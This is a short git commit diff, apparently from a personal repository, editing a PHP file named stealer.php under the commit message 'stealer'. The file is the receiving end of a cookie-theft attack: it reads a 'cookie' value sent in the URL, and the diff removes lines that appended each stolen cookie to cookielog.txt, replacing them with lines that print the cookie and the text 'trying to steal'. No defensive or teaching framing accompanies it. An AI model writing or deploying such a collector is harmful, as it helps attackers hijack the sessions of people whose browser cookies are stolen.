74aebf5a958df5e285714982801b7c10a36eb80e
wildfireone <wildfireone@gmail.com>
2015-12-07 12:52:09 +0000

    stealer

--- stealer.php
+++ stealer.php
@@ -1,5 +1,5 @@
 <?php                                      // line 1
+echo "trying to steal";
 $cookie = $HTTP_GET_VARS["cookie"];       // line 2
-$file = fopen('cookielog.txt', 'a');     // line 3
-fwrite($file, $cookie . "\n\n");        // line 4
+echo $cookie;
 ?>
